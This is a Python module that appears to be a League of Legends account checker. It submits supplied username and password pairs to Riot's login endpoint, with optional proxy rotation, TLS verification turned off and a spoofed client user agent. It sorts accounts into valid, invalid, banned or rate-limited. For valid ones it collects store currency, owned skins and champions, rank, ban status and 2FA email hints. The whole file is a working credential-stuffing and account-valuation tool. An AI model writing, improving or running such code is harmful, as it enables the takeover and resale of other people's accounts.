"""Riot Games authentication and data fetching using requests."""

from __future__ import annotations

import warnings
from urllib.parse import parse_qs, urlparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from config import AUTH_URL, ENTITLEMENTS_URL, PLATFORM_MAP, USERINFO_URL
from models import AccountResult

# Suppress SSL warnings
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

_HEADERS = {
    "User-Agent": (
        "RiotClient/91.0.2.5765.4789 rso-auth (Windows;10;;Professional, x64)"
    ),
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Cache-Control": "no-cache",
}


def _build_session(proxy: str | None, timeout: int) -> requests.Session:
    """Build a requests session with optional proxy."""
    session = requests.Session()
    session.headers.update(_HEADERS)
    session.verify = False

    if proxy:
        session.proxies = {
            "http": proxy,
            "https": proxy,
        }

    return session


def check_account(
    username: str,
    password: str,
    proxy: str | None = None,
    timeout: int = 15,
    verbose: bool = False,
) -> AccountResult:
    """Authenticate and fetch all account data."""
    result = AccountResult(username=username, password=password)

    for attempt in range(2):
        session = _build_session(proxy, timeout)
        try:
            # Step 1: Initialize auth session (get cookies)
            init_body = {
                "client_id": "riot-client",
                "nonce": "1",
                "redirect_uri": "http://localhost/redirect",
                "response_type": "token id_token",
                "scope": "account openid",
            }
            init_resp = session.post(AUTH_URL, json=init_body, timeout=timeout)

            if init_resp.status_code == 429:
                result.status = "RATE_LIMITED"
                result.error_message = "Rate limited (init)"
                return result

            if init_resp.status_code not in (200, 201):
                result.status = "ERROR"
                result.error_message = f"Init failed: HTTP {init_resp.status_code}"
                if attempt == 0:
                    session.close()
                    continue
                return result

            # Step 2: Submit credentials
            auth_body = {
                "type": "auth",
                "username": username,
                "password": password,
                "remember": True,
                "language": "en_US",
            }
            resp = session.put(AUTH_URL, json=auth_body, timeout=timeout)

            if resp.status_code == 429:
                result.status = "RATE_LIMITED"
                result.error_message = "Rate limited"
                return result

            if resp.status_code not in (200, 201):
                result.status = "ERROR"
                result.error_message = f"Auth failed: HTTP {resp.status_code}"
                if attempt == 0:
                    session.close()
                    continue
                return result

            try:
                data = resp.json()
            except Exception:
                result.status = "ERROR"
                result.error_message = f"JSON parse error: {resp.text[:80]}"
                return result

            resp_type = data.get("type", "")

            if resp_type == "response":
                uri = data.get("response", {}).get("parameters", {}).get("uri", "")
                token = _extract_token(uri)
                if not token:
                    result.status = "ERROR"
                    result.error_message = "Token extraction failed"
                    return result

                result.status = "VALID"
                _fetch_account_data(session, token, result, timeout)
                return result

            elif resp_type == "multifactor":
                result.status = "VALID"
                _try_basic_info(data, result)
                return result

            elif resp_type == "auth" and "error" in data:
                error = data["error"]
                if error == "auth_failure":
                    result.status = "INVALID"
                    return result
                elif error == "rate_limited":
                    result.status = "RATE_LIMITED"
                    result.error_message = "Rate limited"
                    return result
                else:
                    result.status = "ERROR"
                    result.error_message = f"Auth error: {error}"
                    return result
            else:
                result.status = "ERROR"
                result.error_message = f"Unknown type: {resp_type} | {str(data)[:60]}"
                return result

        except requests.exceptions.ProxyError:
            result.status = "ERROR"
            result.error_message = f"Proxy dead: {proxy}"
            if attempt == 0:
                session.close()
                continue
        except requests.exceptions.ConnectTimeout:
            result.status = "ERROR"
            result.error_message = f"Connect timeout (proxy: {proxy or 'none'})"
            if attempt == 0:
                session.close()
                continue
        except requests.exceptions.ReadTimeout:
            result.status = "ERROR"
            result.error_message = f"Read timeout (proxy: {proxy or 'none'})"
            if attempt == 0:
                session.close()
                continue
        except requests.exceptions.ConnectionError as e:
            result.status = "ERROR"
            result.error_message = f"Connection error: {str(e)[:60]}"
            if attempt == 0:
                session.close()
                continue
        except Exception as e:
            result.status = "ERROR"
            result.error_message = f"{type(e).__name__}: {str(e)[:80]}"
            if attempt == 0:
                session.close()
                continue
        finally:
            session.close()

    return result


def _extract_token(uri: str) -> str | None:
    """Extract access token from redirect URI fragment."""
    try:
        fragment = urlparse(uri).fragment
        params = parse_qs(fragment)
        tokens = params.get("access_token")
        return tokens[0] if tokens else None
    except Exception:
        return None


def _fetch_account_data(
    session: requests.Session, token: str, result: AccountResult, timeout: int
):
    """Fetch detailed account information using the access token."""
    session.headers["Authorization"] = f"Bearer {token}"

    # Get user info (region, summoner name, etc.)
    try:
        resp = session.get(USERINFO_URL, timeout=timeout)
        if resp.status_code == 200:
            info = resp.json()

            result.region = (
                info.get("lol_account", {}).get("summoner_region", "").upper()
            )
            if not result.region:
                result.region = info.get("region", {}).get("tag", "UNKNOWN").upper()

            result.summoner_name = info.get("lol_account", {}).get(
                "summoner_name", ""
            )
            if not result.summoner_name:
                result.summoner_name = info.get("acct", {}).get("game_name", "")

            result.level = info.get("lol_account", {}).get("summoner_level", 0)
            result.email_verified = info.get("email_verified", False)

            # Check bans
            ban_info = info.get("ban", {})
            if ban_info:
                restrictions = ban_info.get("restrictions", [])
                for r in restrictions:
                    rtype = r.get("type", "")
                    if rtype == "PERMANENT_BAN":
                        result.status = "BANNED"
                        result.ban_status = "PERMANENT"
                        break
                    elif "BAN" in rtype:
                        result.ban_status = "TEMPORARY"
    except Exception:
        pass

    # Get entitlement token
    entitlement_token = None
    try:
        resp = session.post(ENTITLEMENTS_URL, json={}, timeout=timeout)
        if resp.status_code == 200:
            entitlement_token = resp.json().get("entitlements_token")
    except Exception:
        pass

    platform = PLATFORM_MAP.get(result.region, "")

    # Get store/inventory data
    if platform and entitlement_token:
        session.headers["X-Riot-Entitlements-JWT"] = entitlement_token
        _fetch_store_data(session, platform, result, timeout)
        _fetch_ranked_data(session, platform, result, timeout)


def _fetch_store_data(
    session: requests.Session,
    platform: str,
    result: AccountResult,
    timeout: int,
):
    """Fetch store data: RP, BE, skins, champions."""
    region_lower = platform.lower()

    # Try wallet
    try:
        resp = session.get(
            f"https://{region_lower}.store.leagueoflegends.com/storefront/v3/wallet",
            timeout=timeout,
        )
        if resp.status_code == 200:
            wallet = resp.json()
            result.rp = wallet.get("rp", 0)
            result.blue_essence = wallet.get("ip", 0)
    except Exception:
        pass

    # Try purchase history for skins/champions
    try:
        resp = session.get(
            f"https://{region_lower}.store.leagueoflegends.com"
            "/storefront/v3/history/purchase",
            timeout=timeout,
        )
        if resp.status_code == 200:
            inventory = resp.json()
            skins = []
            champs = []
            for item in inventory.get("transactions", []):
                inv_type = item.get("inventoryType", "")
                if inv_type == "CHAMPION_SKIN":
                    skins.append(str(item.get("itemId", "")))
                elif inv_type == "CHAMPION":
                    champs.append(str(item.get("itemId", "")))
            result.skins = skins
            result.skin_count = len(skins)
            result.champions = champs
            result.champion_count = len(champs)
    except Exception:
        pass

    # Fallback: misc view
    if result.skin_count == 0 and result.rp == 0:
        try:
            resp = session.get(
                f"https://{region_lower}.store.leagueoflegends.com"
                "/storefront/v3/view/misc",
                timeout=timeout,
            )
            if resp.status_code == 200:
                data = resp.json()
                result.rp = data.get("player", {}).get("rp", result.rp)
                result.blue_essence = data.get("player", {}).get(
                    "ip", result.blue_essence
                )
        except Exception:
            pass


def _fetch_ranked_data(
    session: requests.Session,
    platform: str,
    result: AccountResult,
    timeout: int,
):
    """Fetch ranked information and summoner level."""
    region_lower = platform.lower()

    # Ranked stats
    try:
        resp = session.get(
            f"https://{region_lower}.ledge.leagueoflegends.com"
            "/leagues-ledge/v2/rankedStats/puuid",
            timeout=timeout,
        )
        if resp.status_code == 200:
            ranked = resp.json()
            queues = ranked.get("queues", [])
            for q in queues:
                if q.get("queueType") == "RANKED_SOLO_5x5":
                    tier = q.get("tier", "UNRANKED")
                    division = q.get("rank", "")
                    lp = q.get("leaguePoints", 0)
                    result.rank = f"{tier} {division} ({lp} LP)"
                    break
    except Exception:
        pass

    # Summoner level
    if result.level == 0:
        try:
            resp = session.get(
                f"https://{region_lower}.ledge.leagueoflegends.com"
                "/summoner-ledge/v1/current",
                timeout=timeout,
            )
            if resp.status_code == 200:
                summoner = resp.json()
                result.level = summoner.get("summonerLevel", 0)
                if not result.summoner_name:
                    result.summoner_name = summoner.get("displayName", "")
        except Exception:
            pass


def _try_basic_info(data: dict, result: AccountResult):
    """Extract whatever info we can from a 2FA-gated response."""
    email = data.get("multifactor", {}).get("email", "")
    method = data.get("multifactor", {}).get("method", "")
    if email:
        result.error_message = f"2FA ({method}) -> {email}"
    else:
        result.error_message = f"2FA ({method})"
